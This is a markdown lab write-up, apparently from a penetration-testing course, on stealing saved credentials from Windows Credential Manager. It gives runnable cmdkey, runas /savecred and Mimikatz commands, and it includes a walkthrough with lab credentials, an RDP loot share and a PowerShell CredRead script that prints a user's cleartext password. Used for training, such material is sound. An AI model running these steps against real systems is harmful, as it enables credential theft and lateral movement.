# 13 — Attacking Windows Credential Manager

## Overview

**Credential Manager** stores credentials for websites, network resources, and services in encrypted vault folders protected by DPAPI. Available since Windows 7 / Server 2008 R2.

---

## Credential Storage Locations

| Path | Scope |
|------|-------|
| `%UserProfile%\AppData\Local\Microsoft\Vault\` | User vaults (local) |
| `%UserProfile%\AppData\Local\Microsoft\Credentials\` | User credentials (local) |
| `%UserProfile%\AppData\Roaming\Microsoft\Vault\` | User vaults (roaming) |
| `%ProgramData%\Microsoft\Vault\` | System-wide vault |
| `%SystemRoot%\System32\config\systemprofile\AppData\Roaming\Microsoft\Vault\` | System profile vault |

Each vault contains a `Policy.vpol` file with AES keys (128 or 256-bit) protected by DPAPI.

---

## Credential Types

| Type | Description |
|------|------------|
| **Web Credentials** | Credentials for websites/online accounts (IE, legacy Edge) |
| **Windows Credentials** | Login tokens for services (OneDrive), domain users, network resources, shares |

---

## Enumeration

### cmdkey — List Stored Credentials

```cmd
cmdkey /list
```
> Lists all credentials stored in Windows Credential Manager for the current user. Run this immediately after gaining access — `Domain:interactive=` entries mean you can impersonate that user without their password.

**Output fields:**

| Field | Meaning |
|-------|---------|
| **Target** | Resource/account the credential is for |
| **Type** | `Generic` (general) or `Domain Password` (domain logon) |
| **User** | Associated user account |
| **Persistence** | `Local machine persistence` = survives reboots |

> `virtualapp/didlogical` entries are internal Microsoft Live/account IDs — can be ignored.

### Export Vault Backup

```cmd
rundll32 keymgr.dll,KRShowKeyMgr
```
> Opens the Stored Usernames and Passwords GUI. Can be used to export credentials to a `.crd` backup file. The backup is encrypted with a user-supplied password.
Creates `.crd` backup file encrypted with user-supplied password. Can be imported on other systems.

---

## Exploitation

### Method 1: runas /savecred — Impersonate Stored User

If `cmdkey /list` shows a `Domain:interactive=` credential:

```cmd
runas /savecred /user:SRV01\mcharles cmd
```
> Spawns a new CMD shell as the target user using their cached credential. `/savecred` tells runas to use stored credentials instead of prompting. No password needed — Windows decrypts the stored credential automatically.

> This spawns a cmd shell as the stored user **without needing their password** (uses the cached credential).

### Method 2: Mimikatz sekurlsa::credman — Dump from LSASS

```cmd
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::credman
```
> Dumps all Credential Manager entries from LSASS memory for all currently logged-on users. `privilege::debug` gets SeDebugPrivilege first — required to read LSASS. Results include username, domain, and cleartext password.

Extracts stored credentials (username, domain, cleartext password) from LSASS memory for all logged-on users.

### Method 3: Mimikatz dpapi Module — Manual Decryption

```cmd
mimikatz # dpapi::cred /in:"C:\Users\<user>\AppData\Local\Microsoft\Credentials\<GUID>"
```
> Reads a specific credential blob from disk and attempts decryption. The GUID is the filename inside the Credentials folder. May require a decrypted DPAPI master key — follow up with `dpapi::masterkey` if this fails.

Then decrypt the master key and use it to reveal the credential.

---

## Other Tools for Credential Manager Extraction

| Tool | Notes |
|------|-------|
| **SharpDPAPI** | C# DPAPI credential extraction |
| **LaZagne** | Multi-purpose credential recovery (browsers, mail, wifi, etc.) |
| **DonPAPI** | Remote DPAPI extraction (no need for local access) |
| **Mimikatz** | sekurlsa::credman or dpapi module |

---

## Attack Workflow Summary

```
1. Get access to target (RDP, shell, etc.)
2. Enumerate: cmdkey /list
3. If Domain:interactive credential found:
   a. Impersonate: runas /savecred /user:<DOMAIN\user> cmd
   b. Or dump with mimikatz: sekurlsa::credman
4. If no cmdkey results, check vault folders manually
5. Use extracted credentials for lateral movement
```

---

## Key Takeaways

- `cmdkey /list` is the first thing to run — shows all cached credentials for the current user
- `runas /savecred` lets you spawn processes as another user using their stored credential **without knowing the password**
- `Domain:interactive=` entries are the most valuable — they're domain/local user passwords
- Credentials are protected by DPAPI → mimikatz `sekurlsa::credman` or `dpapi::cred` can extract them
- Newer Windows uses **Credential Guard** (VBS) to further protect DPAPI master keys — harder to extract
- Always check both `%LocalAppData%` and `%AppData%\Roaming` vault paths
- **If you already have a session as the target user**, skip mimikatz — use `CredRead` API directly (no admin needed)

---

## Exercise Walkthrough — Section 13

> **Target:** 10.129.234.171 (ACADEMY-PWATTCK-CREDDEV01)
> **Creds:** sadams / totally2brow2harmon@
> **Question:** What is the password mcharles uses for OneDrive?

### Step 1 — RDP with Drive Sharing

```bash
xfreerdp /v:10.129.234.171 /u:sadams /p:'totally2brow2harmon@' /drive:share,/tmp/loot /cert:ignore +clipboard
```
> Opens an RDP session with clipboard and a redirected drive. `/drive:share,/tmp/loot` maps the local directory as `\\tsclient\share\` inside the session for file transfers.

### Step 2 — Enumerate Stored Credentials

```cmd
cmdkey /list
```
> Lists saved credentials for the `sadams` session. Look for `Domain:interactive=` entries — these allow impersonation via `runas /savecred`.

**Output:**
```
Target: Domain:interactive=SRV01\mcharles
Type: Domain Password
User: SRV01\mcharles
```

### Step 3 — Impersonate mcharles with runas /savecred

```cmd
runas /savecred /user:SRV01\mcharles cmd
```
> Opens a new CMD shell as mcharles using the cached credential from Credential Manager. No password prompt.

A new cmd window opens as mcharles — **no password needed** (uses cached credential).

### Step 4 — Extract OneDrive Password via CredRead API

In mcharles' cmd, open PowerShell:

```cmd
powershell
```
> Launches PowerShell from within the mcharles CMD session. The resulting PowerShell session runs as mcharles and can decrypt their own credentials.

Then call CredRead to dump the stored Generic credential:

```powershell
$code = @"
using System;
using System.Runtime.InteropServices;

public class CredManager {
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError=true)]
    public static extern bool CredRead(string target, int type, int reserved, out IntPtr cred);
    [DllImport("advapi32.dll")]
    public static extern void CredFree(IntPtr cred);

    [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)]
    public struct CREDENTIAL {
        public int Flags; public int Type; public string TargetName; public string Comment;
        public long LastWritten; public int CredentialBlobSize; public IntPtr CredentialBlob;
        public int Persist; public int AttributeCount; public IntPtr Attributes;
        public string TargetAlias; public string UserName;
    }

    public static void DumpCred(string target) {
        IntPtr ptr;
        if (CredRead(target, 1, 0, out ptr)) {
            CREDENTIAL c = (CREDENTIAL)Marshal.PtrToStructure(ptr, typeof(CREDENTIAL));
            Console.WriteLine("User: " + c.UserName);
            Console.WriteLine("Password: " + Marshal.PtrToStringUni(c.CredentialBlob, c.CredentialBlobSize/2));
            CredFree(ptr);
        } else { Console.WriteLine("Error: " + Marshal.GetLastWin32Error()); }
    }
}
"@
Add-Type -TypeDefinition $code
[CredManager]::DumpCred("onedrive.live.com")
```
> Calls the Windows `CredRead` API directly to decrypt and print a stored credential. Works because the session is running as the credential's owner — no admin or Mimikatz needed. Swap `"onedrive.live.com"` for the target name from `cmdkey /list`.

**Output:**
```
User: mcharles@inlanefreight.local
Password: Inlanefreight#2025
```

### Answer

| Question | Answer |
|----------|--------|
| What is the password mcharles uses for OneDrive? | `Inlanefreight#2025` |

### Key Lesson

- **No admin or mimikatz needed.** Since `runas /savecred` gives you a session as the target user, Windows will decrypt their own credentials via the `CredRead` Win32 API.
- The credential was stored as `LegacyGeneric:target=onedrive.live.com` — a Generic credential (type 1) in Credential Manager.
- `vault::list` and `dpapi::cred /unprotect` both failed due to the `system` flag on the DPAPI blob. The direct API call bypasses this since the OS handles decryption for the authenticated user.
